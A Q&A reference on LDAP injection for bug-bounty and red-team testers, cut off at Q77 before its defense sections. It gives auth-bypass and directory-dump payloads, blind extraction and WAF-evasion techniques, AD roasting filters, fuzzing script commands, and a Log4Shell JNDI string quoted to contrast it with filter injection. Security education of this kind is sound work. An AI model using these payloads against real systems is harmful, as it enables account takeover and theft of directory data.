# LDAP Injection — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **LDAP injection** — from "what is it" to authentication bypass,
> directory disclosure, blind char-by-char extraction, DN injection, Active Directory chains, and defense. Q&A format,
> progressive difficulty. Covers filter syntax (RFC 4515/4514/4526), AND-vs-OR breakout, observability classes
> (data-reflected / auth-oracle / error-based / blind), WAF/escaping evasion, AD enumeration → AS-REP/Kerberoast,
> tooling, methodology, real-world patterns, **and** defense.
>
> ⚖️ **Authorized use only.** Everything here is for bug bounty (in-scope), sanctioned pentests, CTFs, and learning.
> Prove altered filter logic with **your own test accounts** and **bounded** reads, don't dump the directory, don't
> DoS, **clean up**, and never test systems you don't have written permission to test.

**Canonical references** (cited throughout — real and worth reading in full):
- PortSwigger Web Security Academy — *LDAP injection*
- OWASP — *LDAP Injection* + WSTG "Testing for LDAP Injection" (WSTG-INPV-06) + *LDAP Injection Prevention Cheat Sheet*
- HackTricks — *LDAP injection*
- PayloadsAllTheThings — *LDAP Injection*
- RFC 4515 (string search filters), RFC 4514 (DNs), RFC 4526 (absolute true/false filters)
- CWE-90 (LDAP Injection), CWE-74 (Injection), CWE-287 (auth bypass), CWE-285 (authorization)
- Companion kit in this repo: `Web/LDAP/` (guide + arsenal + checklist + report template + `poc/`)

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q9)
- **Level 1 — Finding & confirming injection** (Q10–Q19)
- **Level 2 — Filter syntax, contexts & breakout** (Q20–Q31)
- **Level 3 — Authentication & authorization bypass** (Q32–Q41)
- **Level 4 — Disclosure & blind extraction** (Q42–Q52)
- **Level 5 — DN injection, second-order & evasion** (Q53–Q61)
- **Level 6 — Active Directory & red-team chains** (Q62–Q70)
- **Tooling** (Q71–Q75)
- **Black-box methodology & checklist** (Q76–Q80)
- **Severity, validity & false positives** (Q81–Q86)
- **Cheat sheets** (Q87–Q90)
- **Real-world patterns & references** (Q91–Q93)
- **Defense — preventing LDAP injection** (Q94–Q100)

---

# LEVEL 0 — FUNDAMENTALS

> *Plain version:* LDAP is the company's master directory (who works here, what they may do), and every login/search is a *question* put to it. LDAP injection is editing that question with the directory's own punctuation (`*`, `(`, `)`, `&`) so it answers your way — "username=admin AND (always-true)" makes the password check vanish. No code runs; you change what's asked.

### Q1. What is LDAP injection?
A flaw where user input is concatenated into an **LDAP search filter** (RFC 4515) or a **distinguished name / DN** (RFC 4514) and sent to a directory server without escaping LDAP metacharacters (`* ( ) \ | & !`). By injecting filter syntax, the attacker changes **which entries match** — bypassing authentication (turning a password check into always-true), widening a search to disclose the whole directory, or building a boolean oracle to read attributes one character at a time. It is **CWE-90**.

### Q2. What is LDAP, and where is it used?
LDAP (Lightweight Directory Access Protocol) queries a hierarchical **directory** — typically the organisation's user/group store. The big backends are **Active Directory** (Microsoft) and **OpenLDAP / 389-DS / ApacheDS / OpenDJ / eDirectory**. Apps use it for **login** ("use your corporate credentials"), **people/employee search**, **group/role membership** checks, address books, and appliance/VPN/printer auth. Because it's the source of truth for *identity and authorization*, injecting it pays.

> *Plain version:* same idea as SQLi (edit a query you're not supposed to control) but a different grammar and a lower ceiling. LDAP has no "run a shell command" — its grammar is parentheses and `&`/`|` with the operator written *first* — so instead of quotes-and-comments you juggle brackets and wildcards, and the prize is auth bypass / data theft, not RCE.

### Q3. How is LDAP injection different from SQL injection?
Both are injection into a query language, but LDAP is **not** a code/exec surface: there's no `xp_cmdshell`, no stacked statements, no UNION-to-RCE. LDAP injection's ceiling is **auth/authz bypass and data disclosure**, not RCE. The structure also differs — LDAP filters are **prefix/Polish notation** (`(&(a)(b))`, operators first) with explicit grouping, so "breaking out" means manipulating parentheses and boolean operators (`&`/`|`/`!`) and the wildcard `*`, not quotes and comments.

### Q4. Why is it (often) High or Critical despite no RCE?
Because the two outcomes it *does* give are exactly what enterprises fear:
- **Authentication bypass → account takeover.** Log in as any user — including admin — without their password.
- **Mass disclosure.** Dump every user, email, phone, title, manager, and group membership (PII), and on misconfigured servers, readable `userPassword` **hashes**.
- **Authorization forgery.** Tamper a group-membership check so the app thinks you're in `Domain Admins`.
Add the usual **low bar** (login and search are typically unauthenticated and internet-facing) and you get High/Critical with one request.

### Q5. What are the LDAP filter operators I must know?
```
(attr=value)   equality          (&(A)(B))  AND        (|(A)(B))  OR        (!(A))  NOT
(attr=*)       presence/wildcard  (attr=a*b) substring   (attr>=v)/(attr<=v) ordering   (attr~=v) approximate
(&)  absolute TRUE (matches all)  (|)  absolute FALSE (matches none)   ← RFC 4526
```
Filters are **fully parenthesised** and operators come **first**. This is why injecting `)` and `(` plus a boolean operator lets you restructure the query.

### Q6. Which characters are dangerous (and must be escaped)?
In a **filter value** (RFC 4515 §3): `*` → `\2a`, `(` → `\28`, `)` → `\29`, `\` → `\5c`, NUL → `\00`. In a **DN** (RFC 4514): `, + " \ < > ; =` plus leading/trailing space and a leading `#`. If an app fails to escape these for the **context the input lands in**, it's injectable. (A filter-only escaper is still **DN-injectable**, and vice-versa — Q53.)

### Q7. What are the four observability classes?
- **Data-reflected:** the search **results** are shown (people-search). Easiest — `*` dumps the tree (§10/Q42).
- **Auth-oracle:** a **login** succeeds/fails; the "data" is a session (Q32).
- **Error-based:** a malformed filter throws a visible **LDAP error** that leaks structure/backend (Q15).
- **Blind:** no data, no error, but the response **differs** true-vs-false → a boolean oracle for extraction (Q44).
Most real LDAP injection on login forms is **blind or auth-oracle** — don't expect echoed data.

### Q8. What's the single most important mindset?
**Prove the directory's answer changed in your favor — not that a character was reflected.** Seeing `*` echoed back is *not* a finding. The bug exists only when the *filter behaves differently*: more/other entries returned, an auth/authz decision flipped, or a stable true/false oracle you can read through.

### Q9. Minimum prerequisites before testing?
HTTP + an intercepting proxy (Burp/Caido), the LDAP filter syntax above, the ability to send raw requests (curl/Python) to put payloads in login/search/group params, and — for confirmation/AD enumeration — `ldapsearch` and AD tooling in Kali/WSL. Knowing **AD vs OpenLDAP attribute names** (Q62) saves a lot of guessing.

---

# LEVEL 1 — FINDING & CONFIRMING INJECTION

### Q10. How do I find LDAP sinks (recon)?
Look for **corporate/SSO/VPN/appliance login** ("use your network/domain credentials"), **"search people/employees/directory/address book"**, **group/role checks** ("members of X"), **"forgot username/find my account"**, and signup uniqueness checks. Grep source/JS for `ldap_search`/`DirContext.search`/`DirectorySearcher`/`search_filter`/`ldapjs`. Also flag **stored profile fields** later used in a filter → second-order (Q55).

### Q11. What's the very first test against a suspected sink?
Baseline with a normal value, then send a single `*`, then a single `(`:
1. `q=*` → **more results** than a specific name? → data-reflected & injectable (Q42).
2. `q=alice(` → **LDAP error/500**? → error-based; the `(` reached the raw filter (Q15).
3. `user=*  pass=*` → **login succeeds / different**? → auth-oracle injectable (Q32).
4. `q=alice)(uid=alice)` vs `q=alice)(uid=nobody999)` → **different responses**? → blind oracle (Q44).

### Q12. Why is "I see my `*` reflected" not a finding?
Because reflection ≠ injection. The app may echo your input without it affecting the filter. You must show the **filter's result set changed** (more/other entries), an **auth/authz decision flipped**, or a **stable boolean oracle**. A reflected metachar is, at most, a lead.

### Q13. How do I fingerprint the backend, and why does it matter?
From **attribute names** and **error text**:
- **Active Directory:** `sAMAccountName`, `userPrincipalName`, `memberOf`, `userAccountControl`; base `DC=corp,DC=local`; errors with `DSID-…` and `LDAP: error code 32`.
- **OpenLDAP/389/etc:** `uid`, `cn`, `mail`, `objectClass=inetOrgPerson`; base `dc=example,dc=com`; errors like `javax.naming…` / `ldap_search(): Bad search filter`.
It matters because the **attribute names** you match on (and the AD-specific chains in Q62) depend on it.

### Q14. No data appears — is it safe?
No. Silence on a login usually means **blind or auth-oracle**, not safe. Build the boolean oracle (`)(uid=alice)` vs `)(uid=nobody)`) and the auth-bypass probes (`admin)(&)`) before concluding anything. Blind is the common case on login forms.

### Q15. What is error-based LDAP injection, and what does the error give me?
Sending an unbalanced `(`/`)` or a bad `\` escape throws an LDAP error. The error **confirms** your metachar reached the raw filter (injectable) and often leaks the **backend** and even the **base DN** (AD's `…'CN=…,DC=corp,DC=local'`). Capture it verbatim — it's strong evidence the input is concatenated unescaped, and you reuse the base DN in blind/`ldapsearch` payloads.

### Q16. What benign proof confirms injection for a report?
A **controlled logic difference**: `q=alice` → 1 row vs `q=*)(objectClass=*)` → all rows; or `user=admin)(&)` → logged in vs `pass=wrong` → denied; or a **stable** true/false oracle with a short benign extraction on your own test account. The proof is the *change in the directory's answer*, demonstrated on data you're allowed to touch.

### Q17. Reflected `*` vs altered logic — the rule.
| You have | Verdict |
|---|---|
| `*` echoed in the page | Nothing yet — reflection |
| `*)(objectClass=*)` returns the whole tree | Injection → disclosure |
| `admin)(&)` logs you in | Auth bypass → ATO |
| Group check forced always-true → admin feature | Authz bypass → privesc |
| Stable true/false oracle | Blind injection (extract to prove) |

### Q18. How do I tell LDAP injection apart from Log4Shell/JNDI?
`${jndi:ldap://attacker/x}` (Log4Shell, CVE-2021-44228) makes a vulnerable **logging** library *fetch and deserialize* a remote object → **RCE**. That's **JNDI/deserialization**, not LDAP **filter** injection. They share the letters "LDAP" and you may test both on the same input, but they're different bugs with different impact — report JNDI separately (and it's RCE, so prioritise it).

### Q19. Is LDAP injection still common, or legacy?
Still common in **enterprise** surfaces: intranet/SSO logins, VPN/appliance portals, "employee directory" search, and custom group/role checks — anywhere a developer built an LDAP filter with string concatenation. It's underreported relative to SQLi because hunters skip corporate logins; that's exactly why the in-scope ones pay.

---

# LEVEL 2 — FILTER SYNTAX, CONTEXTS & BREAKOUT

> *Plain version:* the login asks the directory "is there someone with uid=X **AND** password=Y?" Put `admin)(&)` in the username and it becomes "uid=admin AND (always-true)" — one entry (admin) matches, and since the app treats "≥1 match = valid login," you're in as admin. You deleted the part of the question that asked for the password.

### Q20. Walk me through a vulnerable login filter.
Typical: `(&(uid=$user)(userPassword=$pass))`. The app **searches** with this filter; if ≥1 entry matches it treats login as success (often binding as the returned DN). Set `$user = admin)(&)` and `$pass = anything` → `(&(uid=admin)(&))(userPassword=anything))`. The `(&)` is RFC 4526 **absolute-true**, so the AND reduces to "uid=admin AND true" → admin matches → you're in, password never checked.

> *Plain version:* everything hinges on which kind of question you landed in. In an **AND** ("X and Y and Z") you have to make the *whole* thing true, so you add an always-true piece. In an **OR** ("X or Y or Z"), a *single* true piece already wins — much easier. Probe which one you're in before picking a payload.

### Q21. What's the difference between AND-context and OR-context injection?
- **AND** `(&(fixed)(attr=INPUT))`: you're ANDed with a fixed clause, so you must make the **whole** thing match — widen with `*`, add an always-true clause (`*)(objectClass=*`), use absolute-true (`)(&)`), or break out of the group.
- **OR** `(|(fixed)(attr=INPUT))`: a **single** true clause already wins, so injection is easier — `*` or any always-matching clause does it.
Probe which you're in: does `*)(objectClass=*)` widen results (AND breakout) or is one term already over-matching (OR)?

### Q22. How do I break out of an AND filter?
```
INPUT = *                  → (&(fixed)(attr=*))                  match any with attr
INPUT = *)(objectClass=*)  → (&(fixed)(attr=*)(objectClass=*))   stays ONE valid filter → whole tree
INPUT = *))(|(objectClass=*) → (&(fixed)(attr=*))(|(objectClass=*)) break OUT, OR-true (tolerant backends)
INPUT = admin)(&)          → absolute-true inside the group
INPUT = *))%00             → NUL truncates trailing fixed clauses (C servers)
```

### Q23. Why does a breakout payload work on one server but not another?
Because LDAP libraries differ on **trailing data**. **Tolerant** bindings (older PHP `ldap_*`, naive Java/.NET concatenation) accept a second top-level filter after the first or ignore trailing chars — so `)(|(…` and `%00` truncation work. **Strict** bindings (`ldap3`, modern parsers) re-parse and require the **whole string to be one valid filter** — so you must stay inside a single grouped filter (`*`, `*)(objectClass=*`, `admin)(&)`). Always try both styles.

### Q24. What is the `(&)` / `(|)` "absolute true/false" trick?
RFC 4526 defines `(&)` (AND of zero clauses) as matching **everything** and `(|)` (OR of zero clauses) as matching **nothing**. So injecting `)(&)` into an AND filter forces a match (auth bypass), and it's tiny — often slipping past blacklists that block `objectClass` or long payloads. Not every server implements 4526, but many do; it's a high-value, low-noise payload.

### Q25. How does the `*` wildcard behave in different positions?
`(attr=*)` is a **presence** test (matches any entry that *has* the attribute). `(attr=a*)`, `(attr=*x)`, `(attr=a*b)` are **substring** matches. In a search this widens results; in a login it can match the first entry. In blind extraction, substring (`attr=prefix*`) is how you confirm each character (Q47).

### Q26. What does `%00` (NUL) do, and where?
In **C-backed** servers/bindings where the filter is a null-terminated C string, a NUL byte **truncates** the filter at that point — so `admin)(uid=admin))%00` drops the trailing `(userPassword=…)`. Modern, length-aware bindings ignore it. Always worth one try; it cleanly removes inconvenient fixed clauses.

### Q27. My input is escaped (`\2a` shows in errors). Is it over?
Not necessarily. (a) The escaping may be **filter-only** while your input also builds a **DN** → DN injection (Q53). (b) It may escape `*` but not `(`/`)`/`\`. (c) The app may **un-escape** a hex `\2a` you send. (d) A **second-order** path may consume the value unescaped elsewhere (Q55). Probe each before walking away.

### Q28. How do I detect the AND/OR context concretely?
Send `*)(objectClass=*)`: if results **widen to the whole tree**, you're in an AND filter and the breakout works. If a single term already over-matches without breakout, suspect OR. If `)(|(…` errors but `*)(objectClass=*` works, the parser is **strict** (Q23). The `poc/ldap_fuzz.py` script flags the result-count delta for you.

### Q29. What's the role of `!` (NOT) in exploitation?
Useful against **deny** checks like `(!(memberOf=CN=Banned,…))` or `(!(disabled=TRUE))`. You can add an always-true sibling to neutralise the surrounding logic, or craft the value so the NOT evaluates in your favor. NOT also helps build boolean oracles (`)(!(uid=x))` flips true/false).

### Q30. Can I inject into ordering (`>=`/`<=`) or approximate (`~=`) matches?
Yes — and `>=`/`<=` are the key to **fast blind extraction**: instead of testing each character linearly, binary-search with `(attr>=m*)` to halve the candidate range per request (~log₂ instead of N). `~=` (approximate/"sounds-like") rarely matters for exploitation but can leak fuzzy matches.

### Q31. What if the app uses a fixed `objectClass` and only appends my term?
That's the classic AND case: `(&(objectClass=user)(uid=$q))`. `$q = *` → all users; `$q = *)(mail=*)` → all entries with mail; `$q = admin)(&)` in a login → bypass. The fixed `objectClass=user` is just one AND clause you ride alongside — you don't need to remove it, only to add a matching/true clause.

---

# LEVEL 3 — AUTHENTICATION & AUTHORIZATION BYPASS

### Q32. How do I bypass authentication when I know the username?
Inject into the username so the password clause is neutralised:
```
user = admin)(&)         pass = anything   → (&(uid=admin)(&))(userPassword=…))   absolute-true
user = admin)(|(uid=*    pass = anything   → OR-true the rest (tolerant)
user = admin))%00        pass = anything   → truncate the password clause (C servers)
```
You authenticate as `admin` because the search matches `admin` regardless of the password.

### Q33. How do I bypass authentication without knowing any username?
Force the filter to match the **first/any** entry (often a service or admin account in the first OU):
```
user = *)(uid=*))(|(uid=*    pass = anything
user = *                     pass = *
user = *)(|(objectClass=*)   pass = anything
```
Note **which** account you land on — the first OU entry is frequently privileged.

### Q34. Why does "the filter matched" equal "logged in"?
Because many apps implement login as **search-only**: build `(&(uid=$u)(userPassword=$p))`, run a search, and if the result count ≥ 1, issue a session (sometimes binding as the returned DN afterwards). They trust "an entry matched" as "credentials valid." Forcing a match without the real password therefore logs you in — the core auth-bypass mechanism.

### Q35. What's the difference between search-then-bind and the vulnerable pattern?
**Secure (search-then-bind):** search for the user's DN by username, then perform an **LDAP bind** with *that DN + the user-supplied password*; the directory itself verifies the password. Injection into the search can't forge a successful bind. **Vulnerable:** put **both** username and password into one filter and treat a match as success — injection neutralises the password clause. The fix in Q35 wording is exactly the remediation (Q97).

### Q36. The password is hashed/compared in-app, not in the filter. Does bypass still work?
Often yes, if only the **username** is in the filter and the app fetches the user then compares the password to the returned hash. Inject the username to make the search return a **different/privileged** entry (or the first entry), and depending on how the app compares, you may log in as them or learn their hash. If the password is also filtered, target the password clause too (`pass=*` presence). Test the app's exact logic.

> *Plain version:* even a perfect login can be undone by a *second* directory question the app asks to decide permissions: "is user=you AND in-group=Admins?" If your identifier is injectable there, forge that answer to "always yes" and the app treats you as an admin — no membership required. Test these checks separately; they're often the bigger bug.

### Q37. How do I bypass an authorization / group-membership check?
Many apps gate features with `(&(uid=$you)(memberOf=CN=Admins,…))`. If `$you` is injectable:
```
you)(memberOf=*       → (&(uid=you)(memberOf=*))   you "have" a group
you)(|(memberOf=*)    → OR-true the membership
*)(memberOf=CN=Domain Admins,…   → match the admins group regardless of you
you)(&)               → absolute-true → check passes
```
Result: access admin-only functionality without being a member.

### Q38. Why is authz bypass sometimes higher-impact than the login itself?
Because the login may be hardened (search-then-bind) while a **separate** in-app group check still concatenates your identifier. Forging that check grants privileged actions to an already-authenticated low-priv user — a clean **privilege escalation** that hunters miss by only testing the login. Always test group/role checks independently (Q10).

### Q39. After an auth bypass, what's the safe PoC?
Land on a **test-admin account you control**, or stop at "logged in as `<first entry>`" with a screenshot of the post-login page. **Do not** browse a real user's data to "prove" it. Record the payload, the control (wrong password → denied), and which account you reached. That's a complete Critical (admin) / High (user) — Q39 discipline mirrors the IDOR/SQLi kits.

### Q40. Which account do I usually land on with a blind `*` bypass?
The **first matching entry** in the directory's return order — frequently the first user in the base OU, which is often an **administrator or service account** created at setup. That's why a "log in as anyone" bypass so often becomes "log in as admin." Always check and report the *actual* identity you obtained.

### Q41. Can LDAP injection cause account lockout / DoS — and should I worry?
Yes — repeated failed binds can trip **account-lockout** counters (locking real users) and a malformed/huge wildcard can strain the directory. Worry about it: test against **your own** account, avoid hammering admin, keep wildcards bounded, and never submit a DoS as the "PoC." Lockout collateral is a real-world risk that can get you off a program (Q86).

---

# LEVEL 4 — DISCLOSURE & BLIND EXTRACTION

### Q42. How do I turn a people-search into a directory dump?
When results are reflected, widen the filter:
```
q=*                    → every entry with the searched attr
q=*)(objectClass=*)    → whole subtree
q=*)(mail=*)           → all entries with mail (pull emails)
q=*)(memberOf=*)       → group memberships (the privilege graph)
q=*)(userPassword=*)   → readable password hashes, IF the directory exposes them (High/Critical)
```
Quantify the disclosure (e.g. "returns all N users incl. emails") for the report.

### Q43. What attributes are the high-value reads?
**PII:** `cn`/`displayName`, `mail`, `telephoneNumber`, `title`, `department`, `manager`. **Authorization:** `memberOf` (who's admin). **Secrets:** `userPassword` (often not readable, but when it is → hashes), security-question attributes, custom secret fields. **AD-specific:** `sAMAccountName`, `userPrincipalName`, `servicePrincipalName`, `userAccountControl` (Q62).

> *Plain version:* the page shows no directory data, but it *behaves* differently when your injected question is true vs false — that yes/no is a **game of 20 questions**. Ask "does admin's email start with 'a'?", read the yes/no off the response, then "…'ab'?", and rebuild hidden values one character at a time. No data shown ≠ safe.

### Q44. What is blind LDAP injection and how do I confirm it?
No data is reflected, but the response **changes** depending on whether your injected filter matches. Confirm with a stable oracle:
```
TRUE :  q=alice)(uid=alice)        → "found" / 200 / longer body
FALSE:  q=alice)(uid=nobody999)    → "not found" / different
```
Repeat to ensure it's stable (not caching/jitter). That difference is your read channel.

### Q45. What can the boolean oracle tell me with a single request?
**Presence/existence tests** — cheap and high-signal:
```
(&(uid=admin)(userPassword=*))                       does admin have a readable password attr?
(&(uid=NAME)(objectClass=*))                         does this user exist? (enumeration)
(&(uid=admin)(memberOf=CN=Domain Admins,…))          is admin privileged? (authz recon)
```
Each is one yes/no that maps directly to impact.

### Q46. How do I extract an attribute value character-by-character?
Use substring wildcards against the oracle:
```
(&(uid=admin)(mail=a*))    first char 'a'? iterate the charset
(&(uid=admin)(mail=ab*))   grow the prefix once a char is confirmed
```
Repeat per position until no character extends the prefix (end of value). `poc/ldap_blind.py` automates this against your true/false marker.

### Q47. How do I speed up blind extraction?
Binary-search with ordering filters: `(&(uid=admin)(mail>=m*))` tells you the next char is ≥ 'm', halving the candidate set per request (~log₂(charset) instead of N). Also: reduce the charset to what's plausible (lowercase+digits+`@.-_` for emails), parallelise carefully (but mind lockout/SIEM), and stop early — a few characters proves the read (Q39).

### Q48. Which attributes can I actually read blindly?
Only what the **bound identity is permitted to read**. The app's directory service account may be restricted; `userPassword` is frequently unreadable, but `mail`, `description`, `telephoneNumber`, `sAMAccountName`, custom attributes, and `objectClass` usually are. Even reading non-secret PII at scale is a valid disclosure finding — you don't need the password to prove the bug.

### Q49. How do I prove blind extraction safely without dumping the directory?
Extract a **few characters** of a **benign** attribute on **your own test account** (e.g. your test user's `mail` or `objectClass`). That demonstrates arbitrary read access through the oracle — which is the bug — without mass-harvesting real users' PII. State the rate/feasibility in the report; you don't need to actually pull everyone (Q86/§20).

### Q50. Can I enumerate usernames via blind injection?
Yes: `(&(uid=NAME)(objectClass=*))` (or `(&(sAMAccountName=NAME)(objectClass=*))` on AD) returns the true branch only when `NAME` exists. Sweep a wordlist to enumerate valid accounts — useful for password spraying (authorized) or as a disclosure finding on its own. It's cleaner than relying on login error-message differences.

### Q51. Is "the search returned more rows" always a vulnerability?
No — Q81. If the feature is a **designed wildcard search** (the app intends `*` to match-all within scope), returning many rows is expected. It's a finding only when you **exceed the intended scope**: cross into other OUs, surface attributes the UI never exposes (`memberOf`, `userPassword`), or affect auth/authz. Demonstrate the *excess*, not just "lots of results."

### Q52. How do I exfiltrate when even the boolean signal is subtle?
Use any stable differentiator: HTTP **status**, **response length**, a **redirect**, a specific **body string**, or even **timing** if the directory is slow on large match sets (least reliable). Calibrate true vs false first, automate the comparison (`ldap_blind.py` supports `--true`/`--false`), and re-test to exclude noise. The subtler the oracle, the more important the calibration.

---

# LEVEL 5 — DN INJECTION, SECOND-ORDER & EVASION

### Q53. What is DN injection and how does it differ from filter injection?
Sometimes input is concatenated into a **distinguished name** (the bind DN or base DN), e.g. `uid=$user,ou=people,dc=corp,dc=local`. The DN special set (RFC 4514: `, + " \ < > ; =`) **differs** from the filter set, so an app that escapes filter metachars (`*`/`(`/`)`) may still be DN-injectable. Injecting a `,` can add RDN components or change the OU/base the bind/search uses — manipulating scope or which subtree is authenticated against.

### Q54. Give a concrete DN-injection example.
Filter-safe login that builds `uid=$user,ou=people,dc=corp,dc=local` and binds. Set `$user = x,ou=admins` → bind/search DN becomes `uid=x,ou=admins,ou=people,dc=corp,dc=local`, redirecting into a different OU. Combined with weak auth logic, this can change which subtree (and which accounts) the app trusts. Test the DN metacharacters whenever the username builds a DN rather than (only) a filter.

### Q55. What is second-order LDAP injection?
Your input is **stored** (a profile `displayName`/`description`, a group name) and later concatenated into a filter by a *different* feature — an admin user-search, a directory **sync** job, a group resolver — often running with **higher privilege**. Plant a benign marker (`*)(objectClass=*`) in the stored field, trigger the consumer, and watch the filter break/widen. The consuming tier's broader access raises impact.

### Q56. How do I get past a WAF that blocks `*`?
Encode it: `%2a` (URL), `%252a` (double-encode if a decode precedes the filter), or the **LDAP hex escape `\2a`** (apps that un-escape it hand you `*` back). If `*` is fully blocked, lean on the **absolute-true `(&)`** payload (no `*` needed) for auth bypass, or use ordering (`>=`) for blind extraction. One layer at a time; confirm the filter logic still changes (Q11).

### Q57. How do I get past blocks on `(` / `)`?
URL-encode (`%28`/`%29`) or double-encode (`%2528`/`%2529`). Note that the **absolute-true `(&)`** payload still needs parens — but it's short and often the WAF rule targets `objectClass`/`uid=*` patterns, not `(&)`. Where the app **un-escapes** hex, `\28`/`\29` may reach the parser as real parentheses. If parens are truly impossible, you're likely limited to wildcard widening within the existing group.

### Q58. What evasion is specific to attribute-name filters?
Attribute names are **case-insensitive** and have **aliases** (`sAMAccountName`/`samaccountname`, `cn`/`commonName`, `objectClass`/`objectCategory` on AD). If a blacklist keys on `objectClass`, swap to `cn`, `uid`, or `objectCategory` (any always-present attribute). Vary case to dodge case-sensitive WAF rules the directory will still normalise.

### Q59. Does double-encoding help, and when?
When a decoding layer (a proxy, a framework, or the app) decodes the input **before** it's placed in the filter. Then `%252a` → `%2a` (after the first decode) → `*` (after the second). If only one decode happens, single-encoding suffices. Test both; double-encoding specifically defeats WAFs that inspect the once-decoded value but not the twice-decoded one.

### Q60. Can leading/trailing spaces or Unicode bypass filters?
Sometimes. Directories often **normalise** whitespace and certain Unicode forms (e.g. full-width characters) during matching, while a WAF compares the raw bytes. A payload that the WAF sees as "different" but the directory normalises to your intended metacharacter can slip through. It's backend-specific — try it when conventional encoding is blocked.

### Q61. What if everything is escaped and there's no DN/second-order path?
Then the sink is likely **not** injectable — accept it and move on, or pivot to a *different* sink (the group check, the "forgot username" flow, an admin search). Re-test after any code change: a partial fix (escaping `*` but not `(`, or filter-escaping but not DN) is a fresh valid finding (Q84). Don't force a non-finding into a report (Q81).

---

# LEVEL 6 — ACTIVE DIRECTORY & RED-TEAM CHAINS

### Q62. What AD attributes matter most for an injectable front-end?
```
sAMAccountName        the logon name (AD "uid")
userPrincipalName     user@domain (another logon form)
memberOf              groups → privilege graph (Domain Admins etc.)
userAccountControl    flags bitmask: 0x2 disabled, 0x10000 don't-expire, 0x400000 DONT_REQ_PREAUTH
servicePrincipalName  SPNs → Kerberoasting targets
adminCount=1          protected/privileged accounts
objectSid/objectGUID  identifiers
```

### Q63. How do I find AS-REP-roastable accounts via injection/enumeration?
Match the DONT_REQ_PREAUTH flag with AD's bitwise matching rule:
```
(userAccountControl:1.2.840.113556.1.4.803:=4194304)
```
Entries returned have pre-auth disabled → you can request an **AS-REP** and crack it **offline**. Via an injectable search, force the filter to surface these accounts; via `ldapsearch` (with a bind) query it directly.

### Q64. How do I find Kerberoastable accounts?
Match `(servicePrincipalName=*)` → **service accounts** with SPNs. Request a **TGS** for each SPN and crack the ticket offline (Kerberoast). An injectable AD front-end that lets you enumerate SPN accounts hands you the target list; pair with the user list from disclosure (Q42).

### Q65. Why is "injectable AD front-end" a bug-bounty→red-team bridge?
The injection is the **entry** (low-priv or unauth web bug); AD enumeration → AS-REP/Kerberoast → offline crack is the **escalation** to a domain foothold. The web finding alone is reportable (auth bypass / disclosure); in an authorized **red-team** scope it chains to domain compromise. In bug bounty, an enumerated **privileged username/SPN** is sufficient proof — don't run live cracking unless it's in scope.

### Q66. What tooling do I use once I can query AD directly?
```
windapsearch     quick users/groups/Domain Admins enumeration
ldapdomaindump   HTML/JSON dump of users/groups/computers
BloodHound (bloodhound-python)   the privilege/attack-path graph
ldapsearch       targeted filters (the queries in Q63/Q64)
```
See `poc/ldapsearch_cheat.md`. Use them only with a legitimate/in-scope bind, and pace queries (Q86).

### Q67. Can I write to the directory via LDAP injection?
Almost never through **search-filter** injection (it's read-path). Writes need an `add`/`modify`/`modifyDN` operation, which app code rarely builds from raw user input the way it builds filters. If you *do* find a write sink (e.g. a self-service "update my attributes" that concatenates into a `modify`), that's higher impact (could reset passwords / change `memberOf`) — but treat it as a distinct, carefully-scoped finding and avoid destructive changes.

### Q68. How does LDAP disclosure feed other attack kits?
Disclosed **internal hostnames**, **service accounts**, **email formats**, and **group structure** feed: SSRF/recon (internal targets), password spraying & phishing (user list + email format), and privilege mapping (who to target). The directory is a recon goldmine; a disclosure finding often unlocks the next stage of an engagement.

### Q69. What's the OPSEC profile of LDAP attacks?
**Loud if careless.** Failed binds trip **account lockout** and SIEM alerts; blind extraction is **request-heavy**; error-based probing generates **server-side errors** that get logged. Pace everything (jitter, low concurrency), prefer binary-search to cut request counts, test against your own account, and minimise error-based noise once you've fingerprinted. Second-order payloads fire later from a backend context — note timing.

### Q70. How do appliances (VPN/gateway/printer) factor in?
They're a **prime** LDAP-injection surface: many bolt a web login onto an LDAP/AD backend with hand-rolled filter concatenation, are internet-facing, and are under-tested. A bypass there can yield VPN access or appliance admin → internal network foothold. Treat appliance login portals described as "domain/LDAP authentication" as high-priority targets (in scope).

---

# TOOLING

### Q71. Is there a "sqlmap for LDAP injection"?
No universally reliable one — LDAP injection is **parser-dependent**, so blind automation often misfires. The practical toolkit is **manual + helpers**: Burp (Repeater/Intruder), the kit's `poc/ldap_fuzz.py` (context/error/result-delta) and `poc/ldap_blind.py` (boolean extraction), `ldapsearch` for confirmation, and AD tools (`windapsearch`/`ldapdomaindump`/BloodHound) post-bind. Verify every breakout by hand.

### Q72. How do I use `ldap_fuzz.py`?
```bash
python3 poc/ldap_fuzz.py -u "https://target/search?q=FUZZ"
python3 poc/ldap_fuzz.py -u "https://target/login" --method POST --data "user=FUZZ&pass=x" --true "Welcome"
```
It baselines a normal value, sends `*` (result-delta), special chars/breakouts (error-based + AND/OR context), and — with `--true` — auth-bypass payloads. It flags candidates; you confirm the logic change by hand.

### Q73. How do I use `ldap_blind.py`?
```bash
python3 poc/ldap_blind.py -u "https://target/search?q=FUZZ" --true "results" --attr mail --target-uid testuser
```
It builds `(&…(target)(attr=prefix*…))` against your true/false oracle and extracts the attribute char-by-char, bounded by `--maxlen`. Tune `--template` to your context/parser, confirm one known character first, and pace with `--delay`.

### Q74. How do I use Burp Intruder for LDAP injection?
**Sniper** over your breakout/auth-bypass list on the username/search param (watch length/status for the auth marker). **Cluster bomb** for blind extraction: payload set 1 = position prefix, set 2 = charset — but the kit's `ldap_blind.py` is usually faster for the boolean grind. Use Burp's **Comparer** to calibrate the true/false response difference.

### Q75. What does nuclei give me here?
First-pass **candidate discovery** (`-tags ldap`) — it flags endpoints that error on LDAP metacharacters or look LDAP-backed. Treat it as a lead generator only; LDAP exploitation needs the manual context/breakout work nuclei can't do. Always reproduce and prove the logic change yourself (Q81).

---

# BLACK-BOX METHODOLOGY & CHECKLIST

### Q76. Give me the end-to-end methodology in one breath.
Recon LDAP sinks (login/search/group-check) and fingerprint AD vs OpenLDAP → baseline with a normal value, then `*`, then `(` → classify (data-reflected/auth-oracle/error-based/blind) → determine AND-vs-OR context → exploit by impact (auth bypass / disclosure / authz / blind extraction / DN / AD chains) → evade WAF if needed → validate the logic change, set CWE-90, build a safe bounded PoC, dedup, report.

### Q77. What's the fastest triage to know if a param is injectable?
